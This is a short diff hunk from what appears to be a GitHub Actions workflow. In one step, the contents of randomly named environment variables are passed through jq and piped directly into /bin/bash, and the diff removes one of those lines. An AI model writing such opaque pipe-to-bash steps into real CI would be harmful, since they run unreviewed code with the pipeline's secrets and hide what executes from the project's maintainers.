@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$tmrd74834" | jq -r .o0353 | /bin/bash
           echo $me78652 | jq -r .q06 | /bin/bash
           echo $vecyi87 | jq -r .ggwwf62 | /bin/bash
-          printf '%s' "$yso89490" | jq -r .d0 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
